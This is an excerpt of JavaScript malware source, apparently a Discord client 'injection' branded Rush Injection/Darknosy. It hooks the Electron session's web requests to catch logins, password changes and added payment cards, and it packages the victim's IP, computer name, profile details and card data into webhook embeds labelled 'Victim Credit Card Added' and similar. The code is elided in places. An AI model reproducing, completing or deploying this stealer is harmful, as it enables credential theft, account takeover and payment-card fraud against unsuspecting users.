...
const makeEmbed = async ({
    ...
    var params = {
        username: "D4RKN0$6",
        avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcS36kycjUXxnirz-OiysI9dnBkhrBKhxj9Vx5_Ovxo_-oVbAspw",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Darknosy")) fs.rmdirSync(__dirname + "/Darknosy")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Rush Injection Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Darknosy 2023 <a:Badagif:1041634542093619260>](Rush Injector)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "User loged out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "User Login",
                description: "[<a:Badagif:1041634542093619260>  **Oh you have fucked someone**](Darknosy)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    ...
                    fields: [{
                        ...
                        name: "Bio <a:Badagif:1041634542093619260>",
                        value: `\`${user.bio ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1041639670288748634>",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Victim Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
